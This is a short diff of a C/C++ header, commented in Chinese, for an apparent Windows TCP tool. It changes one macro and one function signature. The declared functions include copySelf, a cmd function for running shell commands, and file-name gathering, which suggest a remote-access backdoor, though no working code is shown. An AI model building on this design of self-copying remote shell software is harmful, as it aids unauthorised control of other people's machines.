@@ -26,7 +26,7 @@
 //#define err(errMsg) printf("[line: %d]%s failed code %d\n", __LINE__, errMsg, WSAGetLastError())
 #define FileNameRow MAX_PATH		//定义获取文件名的二维数组大小
 #define FileNameCol MAX_PATH
-#define CMD_RESULT_BUF_SIZE 1024
+
 using namespace std;
 
 struct PC_Message
@@ -70,6 +70,6 @@ int copySelf(char* path);
 //执行shell指令
 int cmd(char* cmdStr, char* message);
 //获取文件名
-void GetFileName(char FileName[FileNameRow][FileNameCol]);
+void GetFileName(char FileName[FileNameRow][FileNameCol], char* str);
 
 #endif // !_TCPSOCKET_H
